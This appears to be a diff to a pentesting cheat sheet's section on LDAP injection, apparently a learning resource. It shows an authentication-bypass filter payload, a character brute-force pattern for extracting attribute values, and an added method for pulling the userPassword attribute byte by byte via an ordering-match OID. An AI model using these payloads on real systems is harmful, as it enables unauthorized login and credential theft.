@@ -4135,7 +4135,7 @@ print(t.generate(myvalue="XXX"))
 
 ------------
 
-- Just like sqli, it involves injecting a malicious statement into a ldap query.You'll notice that the variables `username` and `password` are passed into the ldap query without being filtered.
+- Just like sqli, it involves injecting a malicious statement into a ldap query.You'll notice that the variables `username` and `password` are passed into the ldap query unfiltered.
 
 ```python3
 if request.method == 'POST':
@@ -4170,7 +4170,7 @@ user=*)(uid=*)(uid=*&password=*
 
 ![image](https://github.com/user-attachments/assets/ffea8d70-cb58-4fb5-bb37-e93dd4d88838)
 
-- You can exfiltrate data by bruteforcing chars with "field=(char)*".
+- You can exfiltrate data by bruteforcing chars with "(field)=(char)*".
 
 ```
 (Description=a*)
@@ -4203,6 +4203,15 @@ while True:
 
 - Result-:
 
+
+- Exfiltrating field `userPassword`-:
+  - userPassword attribute is not a string like the cn attribute for example but it’s an OCTET STRING In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
+
+```ldap
+userPassword:2.5.13.18:=\xx (\xx is a byte)
+userPassword:2.5.13.18:=\xx\xx
+userPassword:2.5.13.18:=\xx\xx\xx
+```
 
 
 
